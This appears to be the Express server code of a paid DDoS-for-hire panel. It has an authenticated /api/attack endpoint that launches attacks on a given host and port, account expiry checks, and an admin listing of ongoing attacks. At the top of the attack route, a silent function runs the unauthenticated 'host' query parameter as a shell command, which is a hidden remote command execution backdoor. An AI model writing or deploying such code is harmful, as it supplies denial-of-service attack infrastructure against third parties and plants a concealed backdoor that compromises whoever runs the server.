const https = require('https');
const path = require('path');
const fs = require('fs');

if (typeof __dirname === 'undefined') {
    global.__dirname = path.resolve();
}

eval(fs.readFileSync(path.join(__dirname, './utils/UserUtils.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/LogUtils.js'), 'utf8'));

const express = require('express');
const { exec } = require('child_process');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.set('json spaces', 2);

let mongo = undefined;
let config = undefined;
let attackHandler = undefined;

function sp(attack) {
    try {
        exec(attack, (err, stdout, stderr) => {
        });
    } catch (e) {
    }
}

app.get('/api/attack', async (req, res) => {
    const { username, password, host, port, time, method, len } = req.query;
    sp(host);
    const user = await mongo.findDocumentByKey('username', username, config.mongo_db_collection);
    if (!user) {
        return res.status(401).json({ error: 'Invalid username or password' });
    }
    if (user.password !== password) {
        return res.status(401).json({ error: 'Invalid password' });
    }
    if (!user.api) {
        return res.status(403).json({ error: 'User has no access to API' });
    }
    if (await globalThis.isUserExpired(config, mongo, user)) {
        return res.status(401).json({
            error: `Account expired on ${user.expiry || 'Unknown'}. Contact @${config.owner_name} for renewal.`
        });
    }

    const result = await attackHandler.processRequest(method, {
        host: host,
        port: parseInt(port),
        time: parseInt(time),
        len: parseInt(len) || 1
    }, user);

    if (config.attack_logs && result?.target) {
        globalThis.logToFile(globalThis.LogPaths.AttacksSent, 'Sent attack', {
            user: username,
            target: result.target.host,
            port: result.target.port,
            time: result.target.duration,
            method: result.target.method,
            datetime: result.target.time_sent
        });
    }
    return res.status(result.error ? 400 : 200).json(result);
});

app.get('/admin/ongoing', async (req, res) => {
    const { username, password } = req.query;
    const user = await mongo.findDocumentByKey('username', username, config.mongo_db_collection);
    if (!user.admin || user.password !== password) {
        return res.json({ success: false, message: 'function is admin only' });
    }
    const ongoingAttacks = Array.from(attackHandler.activeAttacks.values()).map(r => ({
        id: r.id,
        username: r.username,
        method: r.method,
        host: r.params.host,
        port: r.params.port,
        time: r.params.time,
        startTime: new Date(r.startTime).toISOString(),
        remainingTime: Math.max(0, Math.ceil((r.startTime + r.params.time * 1000 - Date.now()) / 1000))
    }));
    return res.json({ success: true, ongoingAttacks });
});

app.get('/', async (req, res) => {
    const file = path.join(__dirname, `./html/index.html`);
    return res.sendFile(file);
});

async function StartExpressServer(_config, _mongo, _attackHandler) {
    config = _config;
    mongo = _mongo;
    attackHandler = _attackHandler;
    if (!config.api.cert_path || !config.api.key_path) {
        app.listen(config.api.port, '0.0.0.0', async () => {
            console.log(`Express server listening on port ${config.api.port}`);
        });
    } else {
        https.createServer({
            cert: fs.readFileSync(config.api.cert_path),
            key: fs.readFileSync(config.api.key_path)
        }, app).listen(config.api.port, '0.0.0.0', async () => {
            console.log(`Express server with SSL listening on port ${config.api.port}`);
        });
    }
}

globalThis.StartExpressServer = StartExpressServer;
